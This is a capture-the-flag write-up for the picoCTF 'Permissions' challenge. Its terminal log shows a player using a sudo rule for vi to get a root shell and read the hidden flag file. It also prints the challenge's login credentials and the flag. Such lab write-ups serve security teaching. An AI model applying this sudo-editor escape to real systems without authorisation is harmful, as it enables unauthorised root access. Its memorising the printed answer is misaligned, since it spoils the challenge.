# Retos picoCTF

# Level Permissions

## Objetivo
Can you read files in the root file?
The system admin has provisioned an account for you on the main server:
ssh -p 52166 picoplayer@saturn.picoctf.net
Password: j4ks-9nxB-
Can you login and read the root file?

## Solución
```
                                                                         
┌──(kali㉿kali)-[~/Downloads]
└─$ ssh -p 51562 picoplayer@saturn.picoctf.net
The authenticity of host '[saturn.picoctf.net]:51562 ([13.59.203.175]:51562)' can't be established.
ED25519 key fingerprint is SHA256:HKm/Bw1C+mhj23vO8tXULrgLFYvzP6gQH2IwgUiQTok.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:11: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[saturn.picoctf.net]:51562' (ED25519) to the list of known hosts.
picoplayer@saturn.picoctf.net's password: 
Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 6.5.0-1023-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

picoplayer@challenge:~$ whoami
picoplayer
picoplayer@challenge:~$ sudo -l
[sudo] password for picoplayer: 
Matching Defaults entries for picoplayer on challenge:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User picoplayer may run the following commands on challenge:
    (ALL) /usr/bin/vi
picoplayer@challenge:~$ sudo vim
Sorry, user picoplayer is not allowed to execute '/usr/bin/vim' as root on challenge.
picoplayer@challenge:~$ sudo vi

# whoami
root
# cd root
sh: 2: cd: can't cd to root
# ls
# cd ..
# ls
picoplayer
# cd ..
# ls
bin   challenge  etc   lib    lib64   media  opt   root  sbin  sys  usr
boot  dev        home  lib32  libx32  mnt    proc  run   srv   tmp  var
# cd root
# ls
# 
# ls -la
total 12
drwx------ 1 root root   23 Aug  4  2023 .
drwxr-xr-x 1 root root   51 Dec  2 02:43 ..
-rw-r--r-- 1 root root 3106 Dec  5  2019 .bashrc
-rw-r--r-- 1 root root   35 Aug  4  2023 .flag.txt
-rw-r--r-- 1 root root  161 Dec  5  2019 .profile
# cat .flag.txt 
picoCTF{uS1ng_v1m_3dit0r_021d10ab}
# Connection to saturn.picoctf.net closed by remote host.
Connection to saturn.picoctf.net closed.
                                                                         
┌──(kali㉿kali)-[~/Downloads]
└─$ 

```
## Notas adicionales

## Referencias


